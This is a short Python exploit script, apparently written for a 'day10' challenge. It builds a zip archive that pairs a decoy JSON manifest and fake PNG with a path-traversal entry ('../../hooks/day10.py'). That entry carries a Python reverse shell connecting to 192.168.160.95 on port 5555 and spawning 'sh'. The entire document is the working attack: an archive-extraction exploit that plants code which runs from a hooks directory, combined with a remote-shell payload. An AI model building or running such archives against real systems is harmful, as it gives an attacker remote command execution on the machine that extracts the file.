import zipfile, json

payload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.160.95",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')

with zipfile.ZipFile("day10.zip", "w") as zip:
	zip.writestr("shell.json", json.dumps({"name":"day10 RCE", "assets":["day10.png"]}))
	zip.writestr("day10.png", b"\x89PNG\r\n\x1a\n")
	zip.writestr("../../hooks/day10.py", payload)
